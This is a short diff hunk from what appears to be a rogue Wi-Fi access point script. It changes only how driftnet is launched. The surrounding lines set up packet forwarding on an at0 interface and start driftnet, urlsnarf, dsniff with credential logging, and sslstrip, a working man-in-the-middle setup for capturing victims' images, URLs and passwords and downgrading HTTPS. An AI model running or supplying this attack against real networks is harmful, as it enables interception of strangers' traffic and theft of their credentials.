@@ -77,7 +77,7 @@ iptables --append FORWARD --in-interface at0 -j ACCEPT
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo 'Launching various tools'
-/root/Desktop/driftnet-0.1.6/driftnet -v -i at0 &
+driftnet -v -i at0 &
 gnome-terminal --geometry=121x10+0+600 -x  sh -c "urlsnarf -i at0" &
 gnome-terminal --geometry=31x4-1-1 -x  sh -c "dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log"
 gnome-terminal --geometry=31x4-1-190 -x  sh -c "sslstrip -a -k -f" &
